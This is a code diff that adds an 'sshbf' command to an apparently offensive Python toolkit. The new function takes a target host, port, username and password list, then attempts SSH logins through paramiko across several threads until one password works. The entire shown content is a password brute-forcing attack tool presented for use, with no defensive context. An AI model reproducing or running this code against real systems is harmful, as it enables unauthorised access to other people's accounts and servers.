@@ -29,3 +29,15 @@ def sshbf():
 	host = raw_input('host to connect to (no port)> ')
 	port = input('port> ')
 	user = raw_input('username> ')
+	pwlist = raw_input('path to password list> ').strip()
+	def try_pass(pw):
+		try:
+			client = paramiko.SSHClient()
+			client.connect(host, port, user, pw)
+			client.close()
+		except paramiko.ssh_exception.AuthenticationException:
+			return False
+		return True
+	zc = zippycrack(try_pass,pwlist,numthreads=2,cont=False)
+	zc.run()
+cmds.append(('sshbf','brute force an SSH password with a password list',sshbf))
